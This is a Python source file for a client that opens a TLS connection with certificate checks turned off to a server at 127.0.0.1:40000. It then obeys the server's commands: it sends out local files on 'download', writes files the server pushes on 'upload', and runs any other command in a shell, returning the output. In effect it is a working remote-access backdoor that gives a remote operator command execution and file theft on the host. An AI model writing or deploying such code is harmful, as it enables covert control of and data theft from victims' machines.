import socket
import subprocess
import ssl
from pathlib import Path

class Client():
    """
    Client class that connects to a server, sends and receives messages,
    and handles file transfers and command execution.
    """
    
    def __init__(self):
        """
        Initializes the client with the server's IP address and port.
        """
        self.ip = '127.0.0.1'  # IP address of the server
        self.port = 40000  # Port number of the server
    
    def client_socket(self):
        """
        Establishes a connection to the server using a socket and handles communication.
        This includes sending and receiving messages, managing file uploads/downloads,
        and executing commands received from the server.
        """
        # Create a socket and connect to the server
        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sslconn = context.wrap_socket(client_sock, server_hostname = self.ip)
        sslconn.connect((self.ip, self.port))  # Connect to the server at specified IP and port
        
        # Test message sent to the server
        
        msg = 'TEST CLIENT'  # Example test message
        sslconn.send(msg.encode())  # Send the test message to the server
        
        # Receive a response from the server
        msg = sslconn.recv(4096).decode()
        
        # Loop to keep receiving and processing server commands
        while msg != 'quit':
            msg = list(msg.split(" "))  # Split the received message into command tokens
            
            # If the command is 'download', perform file transfer from client to server
            if msg[0] == 'download':
                filename = msg[1]  # Get the filename from the command
                f = open(Path(filename), 'rb')  # Open the file in binary mode
                contents = f.read()  # Read the file contents
                f.close()  # Close the file
                sslconn.send(contents)  # Send the file contents to the server
                msg = sslconn.recv(4096).decode()  # Wait for server response
                
            # If the command is 'upload', receive a file from the server
            elif msg[0] == 'upload':
                filename = msg[1]  # Get the filename from the command
                filesize = int(msg[2])  # Get the file size from the command
                contents = sslconn.recv(filesize)  # Receive the file contents from the server
                f = open(Path(filename), 'wb')  # Open the file for writing in binary mode
                f.write(contents)  # Write the contents to the file
                f.close()  # Close the file
                sslconn.send('File sent succesfully!'.encode())  # Send confirmation to server
                msg = sslconn.recv(4096).decode()  # Wait for server response
                
            else:
                # If the command is not related to file transfer, execute the command using subprocess
                pr = subprocess.Popen(
                    msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
                )  # Execute the command in the shell
                output, error = pr.communicate()  # Capture the output and errors
                
                # If there is output, send it back to the server, else send the error
                if len(output) > 0:
                    msg = str(output.decode())
                else:
                    msg = str(error.decode())
                sslconn.send(msg.encode())  # Send the output/error back to the server
                msg = sslconn.recv(4096).decode()  # Wait for server response
        
        # Close the socket connection once the server sends 'quit'
        sslconn.close()
        

if __name__ == '__main__':
    """
    Creates and runs the client, which connects to the server and starts
    handling communication through the client_socket method.
    """
    runclient = Client()
    runclient.client_socket()  # Run the client socket function
